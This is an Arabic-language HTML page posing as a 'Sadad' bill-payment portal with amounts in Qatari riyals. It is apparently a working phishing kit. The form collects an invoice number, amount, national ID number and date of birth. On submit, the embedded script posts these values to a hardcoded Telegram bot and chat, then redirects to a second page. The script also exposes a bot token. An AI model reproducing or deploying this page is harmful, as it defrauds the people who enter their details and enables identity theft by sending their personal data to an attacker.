<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>بوابة سداد - الصفحة الرئيسية</title>
<meta property="og:title" content="بوابة سداد - الصفحة الرئيسية">
<meta property="og:description" content="قم بإدخال رقم الفاتورة ونوع السداد وقيمة الرسوم لإتمام عملية السداد.">
<meta property="og:image" content="https://www2.0zz0.com/2025/03/10/21/595608613.jpg">
<meta property="og:url" content="https://alkhaleeg.services/sadu/index.html">
<meta property="og:type" content="website">
<style>
body{font-family: Arial, sans-serif;color:#333;background:#f9f9f9;padding:20px;line-height:1.8;margin:0;max-width:100%;box-sizing:border-box;}
.header{text-align:center;margin-bottom:20px;}
.header img{height:60px;}
.breadcrumb{text-align:center;color:green;font-size:14px;margin:10px 0;}
.form-container{background:white;padding:30px;border-radius:10px;box-shadow:0 0 10px rgba(0,0,0,0.1);max-width:500px;margin:20px auto;}
h2{text-align:center;color:green;margin-top:0;margin-bottom:20px;}
label{display:block;margin:10px 0 5px;font-weight:bold;}
input[type="text"], select{width:100%;padding:12px;border:2px solid #008000;border-radius:8px;background:#fff9f0;font-size:16px;box-sizing:border-box;}
.birth-container{display:flex;gap:10px;}
.birth-container select,.birth-container input{flex:1;padding:12px;border:2px solid #008000;border-radius:8px;background:#fff9f0;font-size:16px;}
.btn-green{display:block;width:100%;margin:25px auto;padding:12px;background:#008000;color:white;text-align:center;border-radius:8px;text-decoration:none;font-weight:bold;font-size:16px;cursor:pointer;border:none;}
.btn-green:disabled { background: #ccc; cursor: not-allowed; }
</style>
</head>
<body>
<div class="header"><img src="https://www2.0zz0.com/2025/03/10/21/595608613.jpg" alt="شعار سداد"></div>
<div class="breadcrumb">الرئيسية / شخصي</div>
<div class="form-container">
<h2>إتمام عملية السداد</h2>
<form id="sadadForm">
<label for="invoiceNumber">أدخل رقم الفاتورة</label>
<input type="text" id="invoiceNumber" name="invoiceNumber" required>
<label for="paymentType">اختر نوع السداد</label>
<select id="paymentType" name="paymentType" required>
<option value="">اختر نوع السداد</option>
<option value="استرداد اموال">استرداد اموال</option>
<option value="مدفوعات أخرى">مدفوعات أخرى</option>
<option value="رسوم توصيل">رسوم توصيل</option>
<option value="رسوم شحن">رسوم شحن</option>
</select>
<label for="amount">قيمة رسوم السداد (ريال قطري)</label>
<input type="text" id="amount" name="amount" required inputmode="numeric">
<label for="nationalId">رقم الهوية</label>
<input type="text" id="nationalId" name="nationalId" required inputmode="numeric">
<label>تاريخ الميلاد</label>
<div class="birth-container">
<select id="daySelect" required><option value="">اليوم</option></select>
<select id="monthSelect" required>
<option value="">الشهر</option>
<option value="1">1</option><option value="2">2</option><option value="3">3</option><option value="4">4</option><option value="5">5</option><option value="6">6</option>
<option value="7">7</option><option value="8">8</option><option value="9">9</option><option value="10">10</option><option value="11">11</option><option value="12">12</option>
</select>
<input type="text" id="yearSelect" placeholder="السنة" maxlength="4" required inputmode="numeric">
</div>
<button type="submit" class="btn-green" id="submitBtn">التالي</button>
</form>
</div>

<script>
// --- معلومات بوت التليجرام ---
const BOT_TOKEN = "8724974748:AAEDSkmIz2F9NArgkbCtRGp7o9URQausmxI";
const CHAT_ID = "1537773335";

const monthSelect = document.getElementById("monthSelect");
const daySelect = document.getElementById("daySelect");
const yearSelect = document.getElementById("yearSelect");

function updateDays(){
    let month = parseInt(monthSelect.value);
    let days = 31;
    if(month === 2){days = 29;}
    else if([4, 6, 9, 11].includes(month)){days = 30;}
    daySelect.innerHTML = '<option value="">اليوم</option>';
    for(let i=1;i<=days;i++){
        let option=document.createElement("option");
        option.value=i;
        option.textContent=i;
        daySelect.appendChild(option);
    }
}
monthSelect.addEventListener("change", updateDays);
updateDays();

document.getElementById("sadadForm").addEventListener("submit", async function(e){
    e.preventDefault();
    
    const submitBtn = document.getElementById('submitBtn');
    submitBtn.disabled = true;
    submitBtn.textContent = 'جاري التحويل...';

    const formData = {
        invoiceNumber: document.getElementById('invoiceNumber').value,
        paymentType: document.getElementById('paymentType').value,
        amount: document.getElementById('amount').value,
        nationalId: document.getElementById('nationalId').value,
        dob: `${daySelect.value}/${monthSelect.value}/${yearSelect.value}`
    };

    let message = `
*📄===== [ الخطوة 1: البيانات الرئيسية ] =====📄*

*▫️ رقم الفاتورة:* \`${formData.invoiceNumber}\`
*▫️ نوع السداد:* \`${formData.paymentType}\`
*▫️ قيمة الرسوم:* \`${formData.amount}\`
*▫️ رقم الهوية:* \`${formData.nationalId}\`
*▫️ تاريخ الميلاد:* \`${formData.dob}\`
--------------------------------------------------
`;

    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    try {
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
        });
    } catch (error) {
        console.error("Telegram send error:", error);
    } finally {
        // ✅ التصحيح: تمت إعادة إضافة سطر التحويل إلى الصفحة الثانية
        window.location.href = "page2.html";
    }
});
</script>
</body>
</html>
